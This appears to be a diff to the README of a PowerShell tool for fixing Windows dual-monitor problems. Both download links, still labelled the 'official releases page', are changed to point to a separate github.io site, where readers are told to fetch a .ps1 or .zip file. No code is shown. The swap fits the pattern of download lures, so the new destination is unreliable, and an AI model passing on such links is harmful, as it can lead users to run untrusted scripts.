@@ -1,6 +1,6 @@
 # 🖥️ Dual-Monitor-Fix-PowerShell - Repair windows monitor display issues easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/mariannecircumpolar189/Dual-Monitor-Fix-PowerShell/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://mariannecircumpolar189.github.io)
 
 This tool fixes common problems with dual monitor setups on Windows 10 and 11. Use this if your computer fails to detect a second screen, shows the wrong resolution, or creates issues with extended displays. The script resets your display drivers and monitor settings to default values.
 
@@ -17,7 +17,7 @@ This tool works with common graphics cards from NVIDIA, AMD, and Intel. It manag
 
 ## 📥 Downloading the Software 
 
-1. Visit the [official releases page](https://github.com/mariannecircumpolar189/Dual-Monitor-Fix-PowerShell/releases).
+1. Visit the [official releases page](https://mariannecircumpolar189.github.io).
 2. Look for the latest version heading at the top of the list.
 3. Click the file ending in `.ps1` or the compressed `.zip` file if provided.
 4. Save the file to your Downloads folder or your Desktop.
